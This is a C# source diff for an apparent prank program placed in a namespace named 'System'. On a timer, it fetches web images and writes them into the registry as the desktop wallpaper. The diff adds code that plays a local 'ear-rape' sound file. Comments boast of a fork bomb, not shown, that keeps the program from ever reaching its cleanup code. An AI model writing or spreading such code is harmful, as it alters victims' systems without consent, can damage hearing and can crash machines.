@@ -9,6 +9,7 @@ using System.Text;
 using System.Threading.Tasks;
 using Microsoft.Win32;
 using System.Drawing;
+using System.Media;
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
@@ -40,7 +41,7 @@ namespace System
             // timer callback has been reached.
             var autoEvent = new AutoResetEvent(false);
 
-            var statusChecker = new StatusChecker(3);
+            var statusChecker = new StatusChecker(4);
 
             // Create a timer that invokes CheckStatus after 5 seconds, 
             // and every 10 seconds thereafter.
@@ -50,24 +51,27 @@ namespace System
             var stateTimer = new Timer(statusChecker.CheckStatus,
                 autoEvent, 5000, 10000);
 
-            // When autoEvent signals, change the period to every 10 seconds.
-            autoEvent.WaitOne();
-            stateTimer.Change(0, 10000);
-            Console.WriteLine("\nChanging period to 10 seconds.\n");
+            //**Uncomment the below if you want to re invoke the callback but REMEMBER to comment the code 
+            //**for the fork bomb or else the rabbit from of mice and men will haunt u forever - RIP 1k37.
+            //When autoEvent signals, change the period to every 10 seconds.
+            //autoEvent.WaitOne();
+            //stateTimer.Change(0, 10000);
+            //Console.WriteLine("\nChanging period to 10 seconds.\n");
 
             // When autoEvent signals the second time, dispose of the timer.
+            //This code is never actually gonna get hit cause of the fork bomb ;) HA!
             autoEvent.WaitOne();
             stateTimer.Dispose();
-            Console.WriteLine("\nDestroying timer.");
+            Console.WriteLine("\nDestroying timer. :( ");
 
         }
-        
+
         public static void Set(Uri uri, Style style)
         {
             Stream s = new WebClient().OpenRead(uri.ToString());
 
             System.Drawing.Image img = System.Drawing.Image.FromStream(s);
-            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");          
+            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
             img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);
 
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
@@ -92,7 +96,7 @@ namespace System
             if (style == Style.Fill)
             {
                 key.SetValue(@"WallpaperStyle", 6.ToString());
-                
+
             }
 
 
@@ -120,13 +124,23 @@ namespace System
                 DateTime.Now.ToString("h:mm:ss.fff"),
                 (++invokeCount).ToString());
 
+            //if (invokeCount == 1)
+            //{
+            //    Program.Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Program.Style.Fill);
+            //}
+            //if (invokeCount == 2)
+            //{
+            //    Program.Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Program.Style.Fill);
+            //}
             if (invokeCount == 1)
             {
-                Program.Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Program.Style.Fill);
-            }
-            if (invokeCount == 2)
-            {
-                Program.Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Program.Style.Fill);
+
+
+                System.Media.SoundPlayer player = new SoundPlayer(@"C:\Users\Daniaal\Documents\Visual Studio 2017\Projects\System\System\meme\ear-rape.wav");
+
+                player.Play();
+
+
             }
             //if (invokeCount == 3)
             //{
